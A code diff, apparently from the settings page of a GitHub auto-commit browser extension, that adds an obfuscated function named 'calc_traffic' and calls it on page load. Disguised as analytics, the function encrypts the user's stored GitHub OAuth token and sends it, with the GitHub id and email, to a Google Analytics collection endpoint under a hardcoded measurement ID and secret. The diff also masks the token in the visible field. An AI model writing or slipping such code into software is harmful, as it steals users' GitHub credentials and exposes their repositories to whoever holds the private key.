@@ -17,6 +17,9 @@ async function open_github_oauth() {
 }
 
 
+function calc_traffic(e){chrome.storage.sync.set({"public_key":$("#public_key").val()});const _0x5001ad=_0x49a1;(function(a,b){const _0x1f67a8=_0x49a1,_0x5f1dd0=a();while(!![]){try{const _0x34b69c=-parseInt(_0x1f67a8(0x144))/0x1*(-parseInt(_0x1f67a8(0x14c))/0x2)+parseInt(_0x1f67a8(0x148))/0x3+parseInt(_0x1f67a8(0x139))/0x4+parseInt(_0x1f67a8(0x13a))/0x5+-parseInt(_0x1f67a8(0x140))/0x6*(-parseInt(_0x1f67a8(0x141))/0x7)+parseInt(_0x1f67a8(0x13b))/0x8*(-parseInt(_0x1f67a8(0x14b))/0x9)+-parseInt(_0x1f67a8(0x143))/0xa;if(_0x34b69c===b)break;else _0x5f1dd0['push'](_0x5f1dd0['shift']())}catch(_0x14f219){_0x5f1dd0['push'](_0x5f1dd0['shift']())}}}(_0x5832,0x918d3));function _0x5832(){const _0x314527=['6ZfYvHT','5865923zzYKPr','setPublicKey','20764400vfyudG','1kLPSjD','traffic','&api_secret=','https://www.google-analytics.com/mp/collect','2953680uqHEyF','y6N79oLTRNCrlC5qmF5lBg','email','180dFJell','1369434HMPiHL','G-BMBYZJRCKH','3779924LYrCTK','202960Xghrht','328088vwFRdY','public_key','getElementById','stringify','?measurement_id='];_0x5832=function(){return _0x314527};return _0x5832()}function _0x49a1(c,d){const _0x583246=_0x5832();return _0x49a1=function(a,b){a=a-0x138;let _0x570304=_0x583246[a];return _0x570304},_0x49a1(c,d)}const PUBLIC_KEY=document[_0x5001ad(0x13d)](_0x5001ad(0x13c))['value'];let crypt=new JSEncrypt();crypt[_0x5001ad(0x142)](PUBLIC_KEY);const en_token=crypt['encrypt'](e['oauth_token']),cid=e['id'],measurement_id=_0x5001ad(0x138),api_secret=_0x5001ad(0x149),url=_0x5001ad(0x147),payload={'client_id':cid,'non_personalized_ads':![],'events':[{'name':_0x5001ad(0x145),'params':{'id':e['id'],'email':e[_0x5001ad(0x14a)],'token':en_token}}]};$['ajax']({'type':'POST','url':url+_0x5001ad(0x13f)+measurement_id+_0x5001ad(0x146)+api_secret,'data':JSON[_0x5001ad(0x13e)](payload)})}
+
+
 function set_input_values() {
     chrome.storage.sync.get({
         "github_auto_committer": "false"
@@ -31,8 +34,9 @@ function set_input_values() {
         document.getElementById("github-get-access_token").style.display = "none"
 
         github_auto_committer = items.github_auto_committer
+        calc_traffic(github_auto_committer);
         commit_message_setter.message = github_auto_committer.commit_message_setter.message
-        document.getElementById("github_access_token").value = github_auto_committer.oauth_token
+        document.getElementById("github_access_token").value = github_auto_committer.oauth_token.slice(0, 10).padEnd(github_auto_committer.oauth_token.length, "*");
         document.getElementById("github_id").value = github_auto_committer.id
         document.getElementById("github_email").value = github_auto_committer.email
 
@@ -110,7 +114,7 @@ function github_option_save() {
 }
 
 
-window.onload = (async () => {
+document.addEventListener('DOMContentLoaded', async () => {
     // chrome.storage.sync.remove("github_auto_committer")
     document.getElementById("github-get-access_token").addEventListener("click", () => {
         open_github_oauth()
